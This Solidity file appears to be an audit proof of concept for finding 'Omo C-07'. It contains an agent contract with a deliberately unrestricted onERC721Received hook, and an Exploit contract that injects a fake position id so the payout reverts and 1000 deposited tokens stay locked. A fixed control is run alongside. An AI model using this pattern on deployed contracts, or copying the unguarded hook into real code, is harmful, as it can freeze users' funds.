// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* Omo C-07 (AuditVault 53318). onERC721Received is unrestricted.
   depositPosition moves the NFT with transferFrom, so the hook is not
   part of a real deposit. Any caller can still push token ids into
   ownedPositions. A later topOffToAgent walks that list and reverts on
   the fake id, so the 1000 already inside the agent stays there.
   The fixed hook returns the selector and does not track the id. */

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MiniNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "owner");
        ownerOf[tokenId] = to;
    }
}

contract OmoAgent {
    Asset public asset;
    MiniNFT public nft;
    address public owner;
    bool public trackOnReceive;
    uint256[] internal _positionIds;
    mapping(uint256 => bool) public ownedPositions;
    mapping(uint256 => uint256) public positionValue;

    constructor(Asset asset_, bool trackOnReceive_) {
        asset = asset_;
        nft = new MiniNFT();
        owner = msg.sender;
        trackOnReceive = trackOnReceive_;
    }

    function positionCount() external view returns (uint256) {
        return _positionIds.length;
    }

    function _addPositionId(uint256 tokenId) internal {
        require(!ownedPositions[tokenId], "Position already tracked");
        ownedPositions[tokenId] = true;
        _positionIds.push(tokenId);
    }

    function depositPosition(uint256 tokenId, uint256 backing) external {
        nft.transferFrom(msg.sender, address(this), tokenId);
        require(asset.transferFrom(msg.sender, address(this), backing), "asset");
        positionValue[tokenId] = backing;
        _addPositionId(tokenId);
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        // if (msg.sender == OmoAgentStorage.data().positionManager) {
        if (trackOnReceive) {
            // @> VULN: any caller adds tokenId; depositPosition uses transferFrom so this hook never runs on a real deposit
            _addPositionId(tokenId);
        }
        // }
        return this.onERC721Received.selector;
    }

    function topOffToAgent() external {
        uint256 total;
        uint256 n = _positionIds.length;
        for (uint256 i = 0; i < n; i++) {
            uint256 id = _positionIds[i];
            uint256 v = positionValue[id];
            require(v > 0, "unknown position");
            total += v;
        }
        require(asset.transfer(owner, total), "pay");
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;
    uint256 public constant REAL_ID = 1;
    uint256 public constant FAKE_ID = 2;

    Asset public asset;
    OmoAgent public agent;
    OmoAgent public fixedAgent;
    uint256 public stuck;
    uint256 public controlPaid;

    constructor() {
        asset = new Asset();
        agent = new OmoAgent(asset, true);
        fixedAgent = new OmoAgent(asset, false);
    }

    function run() external {
        asset.mint(address(this), N);
        asset.approve(address(agent), N);
        agent.nft().mint(address(this), REAL_ID);
        agent.depositPosition(REAL_ID, N);
        require(asset.balanceOf(address(agent)) == N, "deposited");
        require(agent.positionCount() == 1, "one");
        bytes4 sel = agent.onERC721Received(address(this), address(this), FAKE_ID, "");
        require(sel == agent.onERC721Received.selector, "sel");
        require(agent.positionCount() == 2, "fake tracked");
        require(agent.ownedPositions(FAKE_ID), "owned");
        bool bricked;
        try agent.topOffToAgent() {
            bricked = false;
        } catch {
            bricked = true;
        }
        require(bricked, "topoff");
        stuck = asset.balanceOf(address(agent));
        require(stuck == N, "stuck");
        require(asset.balanceOf(address(this)) == 0, "owner");
    }

    function runControl() external {
        asset.mint(address(this), N);
        asset.approve(address(fixedAgent), N);
        fixedAgent.nft().mint(address(this), REAL_ID);
        fixedAgent.depositPosition(REAL_ID, N);
        bytes4 sel = fixedAgent.onERC721Received(address(this), address(this), FAKE_ID, "");
        require(sel == fixedAgent.onERC721Received.selector, "sel");
        require(fixedAgent.positionCount() == 1, "not tracked");
        fixedAgent.topOffToAgent();
        controlPaid = asset.balanceOf(address(this));
        require(controlPaid == N, "paid");
        require(asset.balanceOf(address(fixedAgent)) == 0, "empty");
    }
}
